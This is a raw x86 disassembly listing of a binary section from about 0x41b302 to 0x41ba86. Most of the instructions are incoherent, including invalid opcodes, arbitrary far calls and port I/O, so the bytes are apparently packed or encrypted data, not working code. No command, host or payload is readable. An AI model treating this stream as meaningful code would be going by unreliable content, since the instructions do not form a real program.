  41b302:	icebp  
  41b303:	push   es
  41b304:	lods   eax,DWORD PTR ds:[esi]
  41b305:	loope  0x41b2f6
  41b307:	fiadd  WORD PTR [edi-0x69]
  41b30a:	fidivr WORD PTR [eax+0x78]
  41b30d:	pop    es
  41b30e:	xor    al,al
  41b310:	lea    ecx,[eax]
  41b312:	xchg   eax,edi
  41b314:	test   ebp,0x33e8ef9
  41b31a:	xchg   BYTE PTR [edi+0x67],dh
  41b31d:	pusha  
  41b31e:	(bad)  
  41b31f:	ret    0xfec6
  41b322:	mov    dl,0x56
  41b324:	loope  0x41b2e5
  41b326:	push   ss
  41b327:	or     edx,esp
  41b329:	mov    ch,0x44
  41b32b:	mov    ecx,0xffcab2a6
  41b330:	add    ecx,edi
  41b332:	adc    dl,0x38
  41b335:	sbb    BYTE PTR [eax],0xb7
  41b338:	adc    eax,0x919aca54
  41b33d:	xor    BYTE PTR [edx+0x71],0xe3
  41b341:	or     DWORD PTR [ebp+ecx*8-0x178392fa],0xa345b1cc
  41b34c:	pop    ebx
  41b34d:	cmp    DWORD PTR [ecx],edi
  41b34f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b350:	push   ecx
  41b351:	sub    al,0x72
  41b353:	mov    bl,BYTE PTR [ecx]
  41b355:	and    dh,bh
  41b357:	(bad)  
  41b358:	call   0xe0dd:0x5257cbc6
  41b35f:	cs icebp 
  41b361:	or     DWORD PTR [edx+edx*4],eax
  41b364:	cs inc ecx
  41b366:	lods   eax,DWORD PTR ds:[esi]
  41b367:	ss pop ebp
  41b369:	imul   edx,DWORD PTR [eax],0xe2924514
  41b36f:	cld    
  41b370:	jne    0x41b3b6
  41b372:	in     eax,0x41
  41b374:	inc    eax
  41b375:	lds    esi,FWORD PTR [edx+0x95af51e]
  41b37b:	sbb    esp,DWORD PTR [eax]
  41b37d:	jb     0x41b326
  41b37f:	add    BYTE PTR [edx],al
  41b381:	mov    al,0x61
  41b383:	inc    ebp
  41b384:	pop    edi
  41b385:	ins    DWORD PTR es:[edi],dx
  41b386:	retf   0x9e0d
  41b389:	cmp    cl,BYTE PTR [esi+esi*2+0x103a0a35]
  41b390:	call   0x3f08:0xa501320f
  41b397:	inc    ebp
  41b398:	mov    ah,0x4f
  41b39a:	adc    esp,DWORD PTR ds:[ecx-0x32]
  41b39e:	mov    fs,WORD PTR [esi-0x64]
  41b3a1:	loop   0x41b3b3
  41b3a3:	mov    al,0x31
  41b3a5:	mov    dl,0x1b
  41b3a7:	bound  ebp,QWORD PTR [ebp+0xeeea14e]
  41b3ad:	jno    0x41b403
  41b3af:	test   eax,0x691d27a8
  41b3b4:	mov    BYTE PTR [edx+0x43],bh
  41b3b7:	loop   0x41b38f
  41b3b9:	lods   eax,DWORD PTR es:[esi]
  41b3bb:	in     eax,0xe2
  41b3bd:	and    DWORD PTR [ebp+0x230eb1fa],edx
  41b3c3:	(bad)  
  41b3c4:	cmp    al,0xa9
  41b3c6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b3c7:	jmp    0x41b3df
  41b3c9:	js     0x41b35c
  41b3cb:	shr    BYTE PTR [ecx],cl
  41b3cd:	loopne 0x41b42b
  41b3cf:	or     eax,0x8ee80e9
  41b3d4:	sbb    eax,0xbd2330d5
  41b3d9:	and    edi,DWORD PTR [edi-0x6f]
  41b3dc:	in     eax,dx
  41b3dd:	dec    esi
  41b3de:	xor    esi,DWORD PTR [ebx+edx*4-0x17]
  41b3e2:	and    dh,BYTE PTR [esi]
  41b3e4:	jmp    0x41b3a4
  41b3e6:	jno    0x41b414
  41b3e8:	lock (bad) 
  41b3ea:	(bad)  
  41b3eb:	jnp    0x41b40a
  41b3ed:	loopne 0x41b3c7
  41b3ef:	loope  0x41b3a2
  41b3f1:	add    al,0x18
  41b3f3:	stc    
  41b3f4:	adc    ax,0x228c
  41b3f8:	mov    al,ds:0x1ddd47a6
  41b3fd:	popf   
  41b3fe:	or     bh,BYTE PTR [ebx+0x5b35386b]
  41b404:	xlat   BYTE PTR fs:[ebx]
  41b406:	scas   al,BYTE PTR es:[edi]
  41b407:	dec    eax
  41b408:	and    DWORD PTR [edi],ebx
  41b40a:	(bad)  
  41b40b:	rcr    BYTE PTR [eax-0x438121],1
  41b411:	mov    ebx,0x196e53e5
  41b416:	cs pushf 
  41b418:	mul    DWORD PTR [edi+0x43]
  41b41b:	push   0x97a3fcdb
  41b420:	xor    al,0x26
  41b422:	xor    cl,BYTE PTR [eax+0x14]
  41b425:	xchg   ecx,eax
  41b426:	imul   eax,DWORD PTR [ebx],0xffffff8a
  41b429:	pop    ebp
  41b42a:	(bad)  [ebx-0x66]
  41b42d:	xchg   BYTE PTR [edi],al
  41b42f:	fwait
  41b430:	cwde   
  41b431:	add    DWORD PTR [edi-0x4fd6bbc5],ebx
  41b437:	cmp    ebp,0xb223be88
  41b43d:	mov    eax,DWORD PTR [eax-0x2e]
  41b440:	and    eax,0x7918f19b
  41b445:	icebp  
  41b446:	pop    edi
  41b447:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b449:	arpl   WORD PTR [ebp+esi*2+0x60],sp
  41b44d:	xchg   ecx,eax
  41b44e:	add    dl,BYTE PTR [esi]
  41b450:	shl    DWORD PTR [esi+0x158745fa],cl
  41b456:	jmp    0x3aee1627
  41b45b:	cwde   
  41b45c:	mov    esp,0x9d77f514
  41b461:	in     al,dx
  41b462:	cs add eax,0x5876e6fb
  41b468:	and    eax,0x2a75a17e
  41b46d:	push   esp
  41b46e:	jae    0x41b4d8
  41b470:	add    ah,dh
  41b472:	fcomp  QWORD PTR [esi+0x6df5bc4]
  41b478:	stos   BYTE PTR es:[edi],al
  41b479:	test   DWORD PTR ds:0x66cc59b2,0x5bf0a690
  41b483:	mov    BYTE PTR [eax+0x4aafe94],bh
  41b489:	jecxz  0x41b507
  41b48b:	pop    edi
  41b48c:	fucomi st,st(5)
  41b48e:	mov    eax,ds:0x97b8ff1c
  41b493:	dec    edi
  41b494:	xor    al,BYTE PTR [edi]
  41b496:	ret    
  41b497:	adc    DWORD PTR [ecx+ecx*8+0x4cf06be5],ecx
  41b49e:	lods   eax,DWORD PTR ds:[esi]
  41b49f:	dec    eax
  41b4a0:	shr    DWORD PTR [ebx+0x78e9adbc],0xf5
  41b4a7:	mov    cl,0x6b
  41b4a9:	cdq    
  41b4aa:	ss mov ah,0xb2
  41b4ad:	loopne 0x41b4d5
  41b4af:	jbe    0x41b51a
  41b4b1:	popf   
  41b4b2:	jp     0x41b495
  41b4b4:	shr    BYTE PTR ss:[eax+0x3c208d6],cl
  41b4bb:	(bad)  [ecx+edx*4]
  41b4be:	(bad)  
  41b4bf:	ror    edi,1
  41b4c1:	xlat   BYTE PTR ds:[ebx]
  41b4c2:	je     0x41b47d
  41b4c4:	sahf   
  41b4c5:	pop    ds
  41b4c6:	gs or  ebp,eax
  41b4c9:	in     al,dx
  41b4ca:	jns    0x41b531
  41b4cc:	not    DWORD PTR [edi]
  41b4ce:	test   eax,0x8fa1e6eb
  41b4d3:	sahf   
  41b4d4:	hlt    
  41b4d5:	aas    
  41b4d6:	dec    ecx
  41b4d7:	add    ebx,ebp
  41b4d9:	pop    ebp
  41b4da:	xchg   esp,eax
  41b4db:	mov    dh,0xce
  41b4dd:	rcl    bl,0x3f
  41b4e0:	int    0xa8
  41b4e2:	ds pop ebp
  41b4e4:	or     dl,BYTE PTR [esi+0x7f]
  41b4e7:	aam    0x1b
  41b4e9:	push   ebx
  41b4ea:	(bad)  
  41b4ec:	leave  
  41b4ed:	lods   eax,DWORD PTR ds:[esi]
  41b4ee:	jg     0x41b50a
  41b4f0:	cmc    
  41b4f1:	(bad)  
  41b4f3:	rcr    edi,0xca
  41b4f6:	outs   dx,DWORD PTR ds:[esi]
  41b4f7:	xor    BYTE PTR [edi],bl
  41b4f9:	loop   0x41b50d
  41b4fb:	sub    DWORD PTR [edx-0x22],eax
  41b4fe:	mov    ebp,ebp
  41b500:	mov    esi,0x526f60b8
  41b505:	jmp    0x41b499
  41b507:	cmp    al,0xef
  41b509:	push   ecx
  41b50a:	sbb    DWORD PTR [ebp-0x21147db9],esp
  41b510:	int3   
  41b511:	push   ecx
  41b512:	bound  edx,QWORD PTR [ebx+0xe]
  41b515:	jno    0x41b4c4
  41b517:	mov    dl,0x94
  41b519:	inc    edx
  41b51a:	xchg   BYTE PTR [esi],dh
  41b51c:	rol    BYTE PTR [edx+ebx*2],cl
  41b51f:	xchg   edi,eax
  41b520:	(bad)  
  41b521:	jecxz  0x41b509
  41b523:	outs   dx,DWORD PTR ds:[esi]
  41b524:	loop   0x41b4c6
  41b526:	sub    ebx,edi
  41b528:	repnz sub edi,DWORD PTR ds:0x8ad968f
  41b52f:	ins    BYTE PTR es:[edi],dx
  41b530:	sub    eax,eax
  41b532:	adc    ebx,DWORD PTR [ebx+0x5d6b541f]
  41b538:	cld    
  41b539:	push   esp
  41b53a:	not    DWORD PTR [esi-0xfa8c83]
  41b540:	(bad)  
  41b541:	adc    al,al
  41b543:	call   0xd246:0x64b8660
  41b54a:	je     0x41b54e
  41b54c:	add    edi,DWORD PTR [esp+eiz*8-0x3f40d0c4]
  41b553:	dec    edx
  41b554:	fisub  WORD PTR [edi-0x1be681cb]
  41b55a:	or     BYTE PTR [eax],dl
  41b55c:	lock adc ecx,DWORD PTR [edx]
  41b55f:	(bad)  
  41b560:	(bad)  
  41b561:	mov    esp,DWORD PTR [ecx+0x57]
  41b564:	test   BYTE PTR [edx],al
  41b566:	(bad)
  41b56a:	mov    DWORD PTR ds:0xeb72a7db,ebp
  41b570:	mov    edx,0x58db3379
  41b575:	das    
  41b576:	xor    al,ah
  41b578:	mov    esi,0x26f7c6d1
  41b57d:	or     dh,BYTE PTR [edi-0x7316dc36]
  41b583:	dec    ebx
  41b584:	and    al,0x32
  41b586:	jg     0x41b57c
  41b588:	rcr    ebx,0x1c
  41b58b:	dec    eax
  41b58c:	jae    0x41b554
  41b58e:	sbb    BYTE PTR [esi],0x3b
  41b591:	bnd jl 0x41b543
  41b594:	mov    bl,0xba
  41b596:	call   0xe259:0x57821983
  41b59d:	enter  0x1f6,0x81
  41b5a1:	jp     0x41b59a
  41b5a3:	aaa    
  41b5a4:	lods   eax,DWORD PTR ds:[esi]
  41b5a5:	sub    al,0xbe
  41b5a7:	pushf  
  41b5a8:	mov    fs,WORD PTR [ecx-0x1e23ea54]
  41b5ae:	call   0x7db8:0x7814dea0
  41b5b5:	pop    edx
  41b5b6:	stos   DWORD PTR es:[edi],eax
  41b5b7:	or     edi,DWORD PTR ds:0xedf4a83c
  41b5bd:	pop    ecx
  41b5be:	adc    BYTE PTR [ebx],bl
  41b5c0:	leave  
  41b5c1:	jb     0x41b60c
  41b5c3:	mov    ebx,DWORD PTR [edi+0x1186e09f]
  41b5c9:	sub    DWORD PTR [esi+0x50bd6761],ebp
  41b5cf:	pop    esp
  41b5d0:	push   edi
  41b5d1:	out    0x41,al
  41b5d3:	mul    DWORD PTR [edx+0x31]
  41b5d6:	jl     0x41b638
  41b5d8:	jge    0x41b5d7
  41b5da:	pop    ss
  41b5db:	imul   edx,edi,0xc
  41b5de:	je     0x41b56d
  41b5e0:	jg     0x41b57b
  41b5e2:	sub    DWORD PTR [esi+0x62],0x9af2bac7
  41b5e9:	mov    ebx,0x30cca787
  41b5ee:	sbb    DWORD PTR [eax+0x64],ecx
  41b5f1:	mov    ebp,0x53e35959
  41b5f6:	xchg   ebp,eax
  41b5f7:	mov    cl,0xe5
  41b5f9:	pop    ebp
  41b5fa:	cmp    esi,DWORD PTR [eax+0x41575fbe]
  41b600:	adc    al,0x67
  41b602:	mov    ds:0x41903c90,al
  41b607:	jne    0x41b632
  41b609:	xchg   esp,eax
  41b60a:	stos   DWORD PTR es:[edi],eax
  41b60b:	mov    WORD PTR [ebx],ds
  41b60d:	dec    esp
  41b60e:	push   eax
  41b60f:	sub    eax,0x11169084
  41b614:	lock sbb ecx,DWORD PTR [ecx+0x18]
  41b618:	ins    DWORD PTR es:[edi],dx
  41b619:	adc    ecx,DWORD PTR [eax]
  41b61b:	out    dx,eax
  41b61c:	sbb    dh,0xda
  41b61f:	xchg   esi,eax
  41b620:	lock out dx,eax
  41b622:	push   eax
  41b623:	sbb    BYTE PTR [ecx-0x2222e015],0x1
  41b62a:	sub    ch,ch
  41b62c:	dec    esp
  41b62d:	inc    esi
  41b62e:	push   ecx
  41b62f:	iret   
  41b630:	retf   0xf6c2
  41b633:	and    BYTE PTR [esp+esi*4+0x56],0xbb
  41b638:	cmc    
  41b639:	das    
  41b63a:	retf   0x4538
  41b63d:	jo     0x41b68e
  41b63f:	stos   BYTE PTR es:[edi],al
  41b640:	fdiv   DWORD PTR [ebx+ebx*4+0x19]
  41b644:	pop    esi
  41b645:	jmp    0x41b652
  41b647:	inc    ecx
  41b648:	and    DWORD PTR [ebp*8+0x14e9b12f],edi
  41b64f:	dec    ecx
  41b650:	ret    0xc59b
  41b653:	push   0x66a92851
  41b658:	inc    eax
  41b659:	je     0x41b684
  41b65b:	push   ebx
  41b65c:	jne    0x41b690
  41b65e:	mov    ds:0x785c0b88,al
  41b663:	pushf  
  41b664:	inc    eax
  41b665:	sub    BYTE PTR [edx-0x6d13ff4a],0xc
  41b66c:	jge    0x41b619
  41b66e:	push   eax
  41b66f:	mov    ebp,0x30fb0a1c
  41b674:	cs aaa 
  41b676:	add    al,0x6f
  41b678:	inc    edx
  41b679:	or     dl,dl
  41b67b:	retf   0x9d9f
  41b67e:	imul   BYTE PTR [ebx-0x12fbe98b]
  41b684:	(bad)  
  41b685:	sar    DWORD PTR [esi-0x36],cl
  41b688:	mov    al,0xe
  41b68a:	jge    0x41b68c
  41b68c:	out    dx,al
  41b68d:	outs   dx,BYTE PTR ds:[esi]
  41b68e:	inc    edx
  41b68f:	dec    ecx
  41b690:	arpl   WORD PTR [ebx],sp
  41b692:	adc    ch,BYTE PTR [edx+0x3d81f923]
  41b698:	add    al,0x8d
  41b69a:	ja     0x41b6a1
  41b69c:	(bad)  [edi+0x74]
  41b69f:	mov    cl,0x5
  41b6a1:	push   cs
  41b6a2:	dec    ecx
  41b6a3:	inc    edx
  41b6a4:	hlt    
  41b6a5:	mov    al,0xdc
  41b6a7:	clc    
  41b6a8:	out    dx,al
  41b6a9:	jmp    0xd6ad134b
  41b6ae:	xor    eax,0xde59e55e
  41b6b3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b6b4:	sub    BYTE PTR [ebp-0x8],0x79
  41b6b8:	mov    dh,0xd4
  41b6ba:	out    dx,eax
  41b6bb:	les    ebp,FWORD PTR ds:0xd9711f7b
  41b6c1:	(bad)  
  41b6c2:	pop    ds
  41b6c3:	mov    eax,ds:0x44d5308d
  41b6c8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b6c9:	int    0x9e
  41b6cb:	mov    eax,ds:0xc0add1f
  41b6d0:	fcomip st,st(0)
  41b6d2:	neg    BYTE PTR [edi-0x1865666]
  41b6d8:	mov    ah,0x75
  41b6da:	mov    edx,0x64beb69e
  41b6df:	loope  0x41b67c
  41b6e1:	adc    al,0xd4
  41b6e3:	cmp    dl,BYTE PTR [eax+0x64]
  41b6e6:	sti    
  41b6e7:	rcr    edx,0x1f
  41b6ea:	xor    BYTE PTR [esi+0xc31bbe8],0x85
  41b6f1:	cmp    al,0x8f
  41b6f3:	jp     0x41b67a
  41b6f5:	retf   0x68b4
  41b6f8:	repnz bound edx,QWORD PTR [eax-0x6e]
  41b6fc:	je     0x41b75a
  41b6fe:	inc    edx
  41b6ff:	mov    edx,0x4ed23964
  41b704:	sahf   
  41b705:	jmp    0x41b786
  41b707:	shl    DWORD PTR [esi],1
  41b709:	loope  0x41b6ce
  41b70b:	add    ch,BYTE PTR [ecx]
  41b70d:	mov    ds:0x1506533d,al
  41b712:	sbb    DWORD PTR [edi+0x3e94d948],ebp
  41b718:	adc    dh,0x1
  41b71b:	add    dh,BYTE PTR [edi-0x2]
  41b71e:	inc    ebp
  41b71f:	ret    
  41b720:	test   al,0xb0
  41b722:	inc    ebp
  41b723:	mov    esi,0xa4c7d021
  41b728:	mov    al,ds:0x6084d15f
  41b72d:	mov    ds:0x59330928,al
  41b732:	xor    DWORD PTR [ebp+0x4f2959d2],edx
  41b738:	lock or al,0x5d
  41b73b:	sar    DWORD PTR [esi-0x19f9bb0e],1
  41b741:	(bad)  
  41b742:	in     eax,0x70
  41b744:	pop    esi
  41b745:	add    al,0x39
  41b747:	in     al,0xc7
  41b749:	push   ecx
  41b74a:	loop   0x41b6f1
  41b74c:	cwde   
  41b74d:	shr    DWORD PTR [eax-0x66],cl
  41b750:	scas   al,BYTE PTR es:[edi]
  41b751:	out    dx,eax
  41b752:	ret    
  41b753:	sub    BYTE PTR [edi],ch
  41b755:	data16 jae 0x41b74d
  41b758:	push   ebx
  41b759:	imul   edx,DWORD PTR [esi+esi*2],0x4e
  41b75d:	push   es
  41b75e:	ds mov ch,0x8a
  41b761:	(bad)  
  41b762:	cmp    DWORD PTR [ecx+eiz*2],esp
  41b765:	push   eax
  41b766:	or     BYTE PTR [ecx-0x1816b8a0],0xf6
  41b76d:	push   edi
  41b76e:	jle    0x41b7c3
  41b770:	pushf  
  41b771:	or     bl,al
  41b773:	jmp    0x41b7b8
  41b775:	clc    
  41b776:	outs   dx,BYTE PTR ds:[esi]
  41b777:	clc    
  41b778:	btr    DWORD PTR [eax+0x3e6e7612],esp
  41b77f:	out    dx,eax
  41b780:	add    esi,DWORD PTR [edi+0x71]
  41b783:	data16 test al,0x75
  41b786:	sub    al,0xf4
  41b788:	cwde   
  41b789:	jp     0x41b750
  41b78b:	loop   0x41b712
  41b78d:	add    al,0x76
  41b78f:	sbb    edi,ebx
  41b791:	test   al,0x9c
  41b793:	jbe    0x41b808
  41b795:	hlt    
  41b796:	ss out 0x36,al
  41b799:	mov    dh,0x55
  41b79b:	xor    BYTE PTR [edi-0x44],bh
  41b79e:	jo     0x41b7a1
  41b7a0:	mov    eax,0xde9fe03
  41b7a5:	aaa    
  41b7a6:	stos   DWORD PTR es:[edi],eax
  41b7a7:	test   DWORD PTR [edx+0x7b],0x15c2e735
  41b7ae:	add    ebp,DWORD PTR [edx]
  41b7b0:	adc    BYTE PTR [ecx+0x3389f960],dh
  41b7b6:	je     0x41b7c6
  41b7b8:	test   eax,0xa931af19
  41b7bd:	pop    esp
  41b7be:	outs   dx,BYTE PTR ds:[esi]
  41b7bf:	inc    esi
  41b7c0:	aaa    
  41b7c1:	and    ah,ah
  41b7c3:	data16 outs dx,BYTE PTR ds:[esi]
  41b7c5:	aas    
  41b7c6:	push   esp
  41b7c7:	dec    eax
  41b7c8:	or     edx,ebp
  41b7ca:	adc    BYTE PTR [edi],ch
  41b7cc:	call   0x135e:0xe4128dab
  41b7d3:	push   esi
  41b7d4:	ret    
  41b7d5:	mov    eax,ds:0xcabd4b58
  41b7da:	out    dx,al
  41b7db:	sbb    eax,0x8f01476
  41b7e0:	mov    ebx,0x2ecae5e0
  41b7e5:	icebp  
  41b7e6:	or     eax,0xd6a8a7de
  41b7eb:	mul    al
  41b7ed:	cs cli 
  41b7ef:	sbb    al,0x28
  41b7f1:	and    BYTE PTR [eax+0x66d9faf],ah
  41b7f7:	lods   al,BYTE PTR ds:[esi]
  41b7f8:	jns    0x41b83f
  41b7fa:	mov    esi,0x673c7c65
  41b7ff:	cmp    eax,DWORD PTR [esi-0x6]
  41b802:	fild   QWORD PTR [ebx]
  41b804:	sbb    BYTE PTR [ebx-0x2923f132],cl
  41b80a:	out    dx,eax
  41b80b:	or     ebp,DWORD PTR ss:[eax+0x46]
  41b80f:	sbb    BYTE PTR [edx+0x20],dh
  41b812:	pop    ss
  41b813:	xor    edi,ecx
  41b815:	pop    ecx
  41b816:	cmp    edx,ebx
  41b818:	adc    ah,ah
  41b81a:	jno    0x41b7a6
  41b81c:	sbb    DWORD PTR [ebx+0x32af4d49],esi
  41b822:	cs push cs
  41b824:	sahf   
  41b825:	xor    eax,0x4c9be240
  41b82a:	rcr    BYTE PTR [ecx-0x232d1d56],0x0
  41b831:	icebp  
  41b832:	jmp    0x17608e01
  41b837:	add    DWORD PTR [ebx],eax
  41b839:	mov    ebp,0xbaeb60b4
  41b83e:	sar    BYTE PTR [ecx+0x1dfbd236],cl
  41b844:	popf   
  41b845:	sbb    al,0x94
  41b847:	out    0x61,eax
  41b849:	js     0x41b85d
  41b84b:	and    eax,ebp
  41b84d:	xlat   BYTE PTR ds:[ebx]
  41b84e:	aam    0xf5
  41b850:	cmp    dl,BYTE PTR [eax+0x7aa7ce5d]
  41b856:	jmp    0x41b85f
  41b858:	les    ecx,FWORD PTR [edi-0x5846a84a]
  41b85e:	scas   al,BYTE PTR es:[edi]
  41b85f:	xchg   esi,eax
  41b860:	mov    ebx,ss
  41b862:	and    bl,dl
  41b864:	leave  
  41b865:	push   ebx
  41b866:	lahf   
  41b867:	mov    ecx,0x5ac33fb9
  41b86c:	push   cs
  41b86d:	push   ebp
  41b86e:	and    DWORD PTR [edx-0xe],edi
  41b871:	(bad)  
  41b872:	data16 cli 
  41b874:	mov    ebp,0xf1b7ffc0
  41b879:	xchg   edx,eax
  41b87a:	ret    
  41b87b:	jp     0x41b856
  41b87d:	xchg   DWORD PTR [ecx+0x6d],esi
  41b880:	push   cs
  41b881:	mov    dl,0xa3
  41b883:	dec    edi
  41b884:	mov    cl,0x23
  41b886:	dec    ebp
  41b887:	mov    edx,0xd921ec1d
  41b88c:	sahf   
  41b88d:	das    
  41b88e:	sbb    BYTE PTR [edx],ch
  41b890:	dec    edi
  41b891:	ss fwait
  41b893:	push   ss
  41b894:	and    edx,DWORD PTR [eax]
  41b896:	stos   DWORD PTR es:[edi],eax
  41b897:	push   es
  41b898:	rcr    DWORD PTR [esi],cl
  41b89a:	out    dx,eax
  41b89b:	jl     0x41b8aa
  41b89d:	inc    edi
  41b89e:	xor    DWORD PTR [eax+0x3909e778],ecx
  41b8a4:	fs mov ch,0x12
  41b8a7:	cmp    ebx,DWORD PTR [edx+0x29]
  41b8aa:	xchg   ecx,eax
  41b8ab:	cmp    al,0xc0
  41b8ad:	sbb    esp,esi
  41b8af:	dec    edx
  41b8b0:	mov    edi,0x8615718c
  41b8b5:	push   ss
  41b8b6:	in     eax,dx
  41b8b7:	in     eax,dx
  41b8b8:	loope  0x41b8f0
  41b8ba:	jmp    0x41b852
  41b8bc:	outs   dx,DWORD PTR ds:[esi]
  41b8bd:	les    esi,FWORD PTR [ebp+0x7b7bb29a]
  41b8c3:	mov    ch,0x46
  41b8c5:	or     dl,bh
  41b8c7:	(bad)  [esi-0x5b2bf1cd]
  41b8cd:	popa   
  41b8ce:	inc    edx
  41b8cf:	dec    ebp
  41b8d0:	bound  esp,QWORD PTR [edi+ecx*8]
  41b8d3:	adc    al,0xe3
  41b8d5:	popa   
  41b8d6:	push   0x48
  41b8d8:	pop    ebp
  41b8d9:	sub    DWORD PTR [eax],esp
  41b8db:	inc    esp
  41b8dc:	sub    eax,0xd78ce071
  41b8e1:	in     al,dx
  41b8e2:	shr    DWORD PTR [edx],0x6f
  41b8e5:	mov    dh,0x9f
  41b8e7:	packuswb mm4,mm7
  41b8ea:	stc    
  41b8eb:	test   BYTE PTR [esi+0x7a],bl
  41b8ee:	xor    ebp,DWORD PTR [edi+ebx*8]
  41b8f1:	sub    al,0x47
  41b8f3:	fist   DWORD PTR [ebx]
  41b8f5:	cmp    edi,DWORD PTR [edx]
  41b8f7:	repz stc 
  41b8f9:	adc    DWORD PTR [ebx-0x3e],edi
  41b8fc:	popf   
  41b8fd:	sbb    al,ah
  41b8ff:	(bad)  
  41b900:	or     edx,eax
  41b902:	shl    DWORD PTR [edx],0x52
  41b905:	repz jmp FWORD PTR [ebx-0x36]
  41b909:	fld    QWORD PTR [eax+0x26]
  41b90c:	loope  0x41b93a
  41b90e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b90f:	lahf   
  41b910:	fsub   DWORD PTR [edx+ecx*8+0x2b]
  41b914:	sub    al,0x2a
  41b916:	sub    bh,BYTE PTR [edx]
  41b918:	jbe    0x41b917
  41b91a:	lea    ecx,[eax+0xfd7e9e0]
  41b920:	push   ebp
  41b921:	mov    esp,0x4f2ddae3
  41b926:	mov    eax,0x782afa7f
  41b92b:	mov    edx,0xb49160e1
  41b930:	xchg   esp,eax
  41b931:	jae    0x41b925
  41b933:	push   edi
  41b934:	pop    edx
  41b935:	sbb    al,0xfa
  41b937:	(bad)  
  41b938:	mov    BYTE PTR [ecx+eiz*1+0x2],bh
  41b93c:	add    DWORD PTR [esp+ebp*4],ebp
  41b93f:	add    ecx,DWORD PTR [bx+0x6]
  41b943:	clc    
  41b944:	inc    edx
  41b945:	push   edx
  41b946:	enter  0xf802,0xe6
  41b94a:	stc    
  41b94b:	aaa    
  41b94c:	mov    bl,0xc2
  41b94e:	shl    DWORD PTR [edx*1+0x155bcd73],cl
  41b955:	(bad)  
  41b956:	cmp    eax,0x930324d3
  41b95b:	je     0x41b8f2
  41b95d:	arpl   WORD PTR [ecx],cx
  41b95f:	xchg   BYTE PTR [edx],dh
  41b961:	xchg   ebp,eax
  41b962:	mov    eax,0x341b8391
  41b967:	mov    ah,0xc5
  41b969:	(bad)  [eax+0x4d]
  41b96c:	sar    DWORD PTR [ebp-0x3105846f],0x49
  41b973:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b974:	mov    WORD PTR [edi+esi*4+0x53],gs
  41b978:	(bad)  
  41b979:	xor    BYTE PTR [ebx],cl
  41b97b:	out    dx,al
  41b97c:	inc    ebp
  41b97d:	mov    dh,0xba
  41b97f:	cmp    BYTE PTR [eax+0x27],0x4b
  41b983:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b984:	nop
  41b985:	out    dx,eax
  41b986:	adc    al,0xc7
  41b988:	stc    
  41b989:	std    
  41b98a:	add    esp,DWORD PTR [edi]
  41b98c:	mov    edx,0x2cbb0bfe
  41b991:	inc    esi
  41b992:	jns    0x41b9da
  41b994:	jmp    0x411bdebe
  41b999:	test   eax,0xef4a7d16
  41b99e:	push   ebp
  41b99f:	cmp    BYTE PTR ds:0x7e62f1df,0xc5
  41b9a6:	(bad)  
  41b9a7:	jp     0x41b9fc
  41b9a9:	pop    ss
  41b9aa:	push   es
  41b9ab:	call   0x54c3591f
  41b9b0:	and    bh,BYTE PTR [ecx-0x49e60f80]
  41b9b6:	xor    ch,BYTE PTR [esp+eax*8-0xa]
  41b9ba:	dec    ebx
  41b9bb:	push   es
  41b9bc:	gs std 
  41b9be:	in     eax,dx
  41b9bf:	loop   0x41ba30
  41b9c1:	or     al,0x46
  41b9c3:	or     al,0x28
  41b9c5:	lods   al,BYTE PTR es:[esi]
  41b9c7:	jmp    0xb4d3:0x90127939
  41b9ce:	out    0xbe,al
  41b9d0:	dec    ebx
  41b9d1:	rcl    DWORD PTR [edx+eiz*8+0x6f],1
  41b9d5:	sub    ch,BYTE PTR [edi-0xa210a6]
  41b9db:	(bad)  
  41b9dd:	test   BYTE PTR [esi+ecx*2-0x34afee60],dh
  41b9e4:	ret    
  41b9e5:	loopne 0x41ba3d
  41b9e7:	pop    ecx
  41b9e8:	cmp    eax,0x77cbbdb0
  41b9ed:	rol    BYTE PTR [esi+0x22],1
  41b9f0:	and    eax,0xc603425d
  41b9f5:	aas    
  41b9f6:	jmp    0x41b9cd
  41b9f8:	int3   
  41b9f9:	and    DWORD PTR [edx],eax
  41b9fb:	adc    esi,DWORD PTR [esp+edi*4+0x67]
  41b9ff:	shl    BYTE PTR [edi+0x71],cl
  41ba02:	xor    al,0xe0
  41ba04:	jecxz  0x41ba16
  41ba06:	ret    
  41ba07:	adc    cl,cl
  41ba09:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ba0a:	and    al,BYTE PTR [esi+0x1b]
  41ba0d:	fidivr DWORD PTR [edx+0x4ae93d88]
  41ba13:	sub    eax,0x1bf45264
  41ba18:	push   ss
  41ba19:	mov    DWORD PTR [eax+0x40f0641f],0xb34339d1
  41ba23:	add    eax,0x686fca59
  41ba28:	or     BYTE PTR [edi],0xcc
  41ba2b:	in     al,0x60
  41ba2d:	icebp  
  41ba2e:	xchg   edi,eax
  41ba2f:	mov    ebp,0xa46ae91e
  41ba34:	mov    eax,0x23513b78
  41ba39:	je     0x41b9bb
  41ba3b:	pushf  
  41ba3c:	rol    edx,0x9b
  41ba3f:	ret    
  41ba40:	stc    
  41ba41:	mov    esp,ebp
  41ba43:	or     bl,dl
  41ba45:	ficomp WORD PTR [ecx]
  41ba47:	inc    ebx
  41ba48:	(bad)  
  41ba49:	mov    dh,0x5f
  41ba4b:	test   DWORD PTR [ebx+esi*8-0x28],eax
  41ba4f:	shl    esp,0x37
  41ba52:	jmp    DWORD PTR [ebx-0x4f]
  41ba55:	mov    ah,0x35
  41ba57:	jns    0x41bad7
  41ba59:	jmp    FWORD PTR [eax]
  41ba5b:	ins    BYTE PTR es:[edi],dx
  41ba5c:	jno    0x41b9de
  41ba5e:	xor    al,0x6e
  41ba60:	xchg   edi,eax
  41ba61:	sub    esi,DWORD PTR [edi-0x2e]
  41ba64:	inc    esi
  41ba65:	adc    BYTE PTR [ebp-0x37e4f153],ch
  41ba6b:	(bad)  
  41ba6c:	mov    eax,0x1baf0c30
  41ba71:	popf   
  41ba72:	fist   WORD PTR [ecx+0x71d58120]
  41ba78:	jb     0x41ba26
  41ba7a:	dec    ebp
  41ba7b:	mov    edx,0x6cfb3f12
  41ba80:	into   
  41ba81:	mov    ds:0x95cce52d,eax
  41ba86:	pop    eax
